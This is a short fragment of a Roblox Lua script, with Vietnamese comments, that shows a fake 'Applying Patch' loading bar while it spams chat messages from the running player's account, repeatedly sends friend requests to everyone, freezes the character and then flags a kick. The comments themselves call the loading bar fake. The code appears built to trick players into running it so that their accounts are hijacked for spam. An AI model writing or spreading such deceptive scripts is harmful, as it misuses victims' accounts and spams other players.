    task.spawn(function()
        local msgIndex = 1
        while not isKicking do
            pcall(function() Say(messages[msgIndex]) end)
            msgIndex = (msgIndex % #messages) + 1
            
            -- Cứ mỗi 10 giây lại gửi kết bạn lại một lần cho chắc
            if msgIndex == 1 then FriendEveryone() end 
            
            task.wait(3.5)
        end
    end)

    -- Hiệu ứng thanh Loading giả
    task.spawn(function()
        for i = 1, 100 do
            if isKicking then break end
            StatusText.Text = "Applying Patch: " .. i .. "%"
            task.wait(0.6)
        end
        isKicking = true
    end)

    -- Khóa nhân vật
    pcall(function() game.Players.LocalPlayer.Character.PrimaryPart.Anchored = true end)

